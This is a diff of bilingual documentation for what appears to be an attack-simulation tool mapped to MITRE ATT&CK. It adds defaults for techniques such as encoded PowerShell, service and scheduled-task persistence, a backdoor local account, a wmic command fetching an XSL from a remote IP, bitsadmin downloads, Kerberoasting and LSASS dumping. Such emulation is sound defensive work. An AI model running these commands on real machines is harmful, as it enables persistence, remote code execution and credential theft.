@@ -12,9 +12,9 @@
 
 #### Parameters
 
-| **Parameter** | **Description** |
-| ------------- | --------------- |
-| `filePath`    | 可执行文件路径  |
+| **Parameter** | **Description**                    |
+| ------------- | ---------------------------------- |
+| `filePath`    | 可执行文件路径，默认powershell.exe |
 
 
 
@@ -24,14 +24,14 @@
 
 | **Variation** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| 1             | This module uses the Win32 API CreateProcess to execute the specifiedcommandlet:`powershell.exe -enc {command}` |
+| 1             | This module uses the Win32 API CreateProcess to execute the specified commandlet:`powershell.exe -enc {command}` |
 | 2             | This module uses the the System.Management.Automation .NET namespace to execute the specified command. |
 
 #### Parameters
 
-| **Parameter** | **Description**                                             |
-| ------------- | ----------------------------------------------------------- |
-| `command`     | The PowerShell commandlet to be executed in the simulation. |
+| **Parameter** | **Description**                                              |
+| ------------- | ------------------------------------------------------------ |
+| `command`     | The PowerShell commandlet to be executed in the simulation.默认whoami |
 
 ### [T1059.003](https://attack.mitre.org/techniques/T1059/003/) Command and Scripting Interpreter: Windows Command Shell
 
@@ -53,13 +53,13 @@
 
 | **Variation** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| 1             | This module uses the Win32 API CreateProcess to execute the specifiedVB script:wscript.exe **filePath** |
+| 1             | This module uses the Win32 API CreateProcess to execute the specified VB script: wscript.exe **filePath** |
 
 #### Parameters
 
-| **Parameter** | **Description**                       |
-| ------------- | ------------------------------------- |
-| filePath      | The local file path of the VB script. |
+| **Parameter** | **Description**                                              |
+| ------------- | ------------------------------------------------------------ |
+| filePath      | The local file path of the VB script. 默认`./file/T1059.005.vbs` |
 
 ### [T1059.007](https://attack.mitre.org/techniques/T1059/007/) Command and Scripting Interpreter: JavaScript/JScript
 
@@ -71,9 +71,9 @@
 
 #### Parameters
 
-| **Parameter** | **Description**                       |
-| ------------- | ------------------------------------- |
-| filePath      | The local file path of the JS script. |
+| **Parameter** | **Description**                                              |
+| ------------- | ------------------------------------------------------------ |
+| filePath      | The local file path of the JS script. 默认`./file/T1059.007.js` |
 
 ### [T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task/Job: Scheduled Task
 
@@ -87,9 +87,9 @@
 
 | **Parameter** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| taskName      | The name of the task to be created.                          |
-| taskPath      | The path of the binary to be executed by the scheduled task. |
-| cleanup       | Bool parameter to delete the scheduled task after created.   |
+| taskName      | The name of the task to be created. 默认`BadScheduledTask`   |
+| taskPath      | The path of the binary to be executed by the scheduled task. 默认`C:\Windows\Temp\xyz12345.exe` |
+| cleanup       | Bool parameter to delete the scheduled task after created. 默认false |
 
 ### [T1569.002](https://attack.mitre.org/techniques/T1569/002/) System Services: Service Execution
 
@@ -101,10 +101,11 @@
 
 #### Parameters
 
-| **Parameter** | **Description**                                |
-| ------------- | ---------------------------------------------- |
-| servicePath   | 创建的服务的binpath                            |
-| serviceName   | The name of the Windows service to be started. |
+| **Parameter** | **Description**                                              |
+| ------------- | ------------------------------------------------------------ |
+| servicePath   | 创建的服务的binpath，默认`C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin\\mysql.exe` |
+| serviceName   | The name of the Windows service to be started. 默认`UpdaterService` |
+| cleanup       | 是否停止并删除service                                        |
 
 
 
@@ -118,16 +119,16 @@
 
 | **Variation** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| 1             | This module uses the Win32 API NetUserAdd to create a local accountwith the specified parameters. |
-| 2             | This module uses the Win32 API CreateProcess to create a local accountwith the specified parameters.net user **user** **password** /add |
+| 1             | This module uses the Win32 API NetUserAdd to create a local account with the specified parameters. |
+| 2             | This module uses the Win32 API CreateProcess to create a local accountwith the specified parameters. net user **user** **password** /add |
 
 #### Parameters
 
-| **Parameter** | **Description**                                  |
-| ------------- | ------------------------------------------------ |
-| user          | The user to be created.                          |
-| password      | The password to be used.                         |
-| cleanup       | Bool parameter to delete the user after created. |
+| **Parameter** | **Description**                                            |
+| ------------- | ---------------------------------------------------------- |
+| user          | The user to be created. 默认haxor                          |
+| password      | The password to be used. 默认`Passw0rd123El7`              |
+| cleanup       | Bool parameter to delete the user after created. 默认false |
 
 ### [T1543.003](https://attack.mitre.org/techniques/T1543/003/) - Create or Modify System Process: Windows Service
 
@@ -135,17 +136,17 @@
 
 | **Variation** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| 1             | This module uses the CreateProcess Win32 API to execute `sc create $serviceName binpath=$servicePath type= own start= auto` |
-| 2             | This module uses the Win32 API CreateProcess to create a WindowsService with the specified parameters. |
+| 1             | This module uses the Win32 API OpenSCManager to create a WindowsService with the specified parameters. |
+| 2             | This module uses the CreateProcess Win32 API to execute `sc create $serviceName binpath=$servicePath type= own start= auto` |
 
 #### Parameters
 
 | **Parameter**      | **Description**                                              |
 | ------------------ | ------------------------------------------------------------ |
-| serviceName        | The name of the Windows service to be created.               |
-| servicePath        | The path of the binary that will be executed by the service. |
-| serviceDisplayName | The service display name.                                    |
-| cleanup            | Bool parameter to delete the Service after created.          |
+| serviceName        | The name of the Windows service to be created. 默认`UpdaterService` |
+| servicePath        | The path of the binary that will be executed by the service. 默认`C:\Windows\Temp\superlegit.exe` |
+| serviceDisplayName | The service display name.默认`Super Legit Update Service`    |
+| cleanup            | Bool parameter to delete the Service after created. 默认false |
 
 ### [T1547.001](https://attack.mitre.org/techniques/T1547/001/) - Boot or Logon Autostart Execution: Registry Run Keys
 
@@ -162,7 +163,7 @@
 | ------------- | ------------------------------------------------------------ |
 | regPath       | 注册表路径，默认`HKCU/SOFTWARE/Microsoft/Windows/CurrentVersionRun` |
 | regKey        | 注册表键，默认`BadApp`                                       |
-| regValue      | 注册表值，默认`C:Windows\Temp\xyz12345.exe`                  |
+| regValue      | 注册表值，默认`C:\Windows\Temp\xyz12345.exe`                 |
 | cleanup       | Bool parameter to delete the Service after created.          |
 
 ### [T1546.003](https://attack.mitre.org/techniques/T1546/003/) - Event Triggered Execution: Windows Management Instrumentation Event Subscription
@@ -260,9 +261,9 @@ wmic.exe os get /FORMAT "$url”
 
 #### Parameters
 
-| **Parameter** | **Description**                                              |
-| ------------- | ------------------------------------------------------------ |
-| url           | 下载恶意文件的url, 默认http://100.1.1.169:8080/T1218.010.xsl |
+| **Parameter** | **Description**                                          |
+| ------------- | -------------------------------------------------------- |
+| url           | 下载恶意文件的url, 默认http://100.1.1.169:8080/T1220.xsl |
 
 
 
@@ -489,13 +490,23 @@ bitsadmin.exe /transfer job /download /priority high $url $filePath
 
 This module uses the KerberosRequestorSecurityToken Class to obtain Kerberos service tickets.
 
+#### Variations
+
+| **Variation** | **Description**                            |
+| ------------- | ------------------------------------------ |
+| 1             | 为所有已识别的SPN请求服务票据              |
+| 2             | 请求随机SPN的服务票证，user_target_total个 |
+| 3             | 指定多个服务                               |
+
+
+
 #### Parameters
 
-| **Parameter**     | **Description**                                              |
-| ----------------- | ------------------------------------------------------------ |
-| variation         | 1：为所有已识别的SPN请求服务票据<br />2：请求随机SPN的服务票证，user_target_total个<br />3：指定多个服务 |
-| user_target_total | 默认5                                                        |
-| task_sleep        | 间隔时间，默认0                                              |
+| **Parameter**     | **Description** |
+| ----------------- | --------------- |
+| user_target_total | 默认5           |
+| task_sleep        | 间隔时间，默认0 |
+| user_targets      | 指定多个服务    |
 
 ### [T1003.001](https://attack.mitre.org/techniques/T1003/001/) - OS Credential Dumping: LSASS Memory
 
@@ -685,12 +696,13 @@ net localgroup "Administrators"
 | ------------- | ------------------------------------------------------------ |
 | 1             | This module uses the CreateProcess Win32 API to execute `net group $groups /domain` |
 | 2             | 执行`powershell.exe Get-AdGroup -Filter {{Name -like '$group'}} | Get-ADGroupMember | Select SamAccountName` |
+| 3             | Querying LDAP for `$groups`                                  |
 
 #### Parameters
 
 | **Parameter** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| groups        | 需要探测的所有组名，可以填写多个，默认为空，若不填写，Variation1会执行`net group /domain`，Variation2会执行`powershell.exe Get-AdGroup -Filter {{Name -like 'Domain Admins'}} | Get-ADGroupMember | Select SamAccountName` |
+| groups        | 需要探测的所有组名，可以填写多个，默认为空，若不填写，Variation1会执行`net group /domain`，Variation2会执行`powershell.exe Get-AdGroup -Filter {{Name -like 'Domain Admins'}} | Get-ADGroupMember | Select SamAccountName`， Variation1不指定groups时查询所有group |
 
 
 
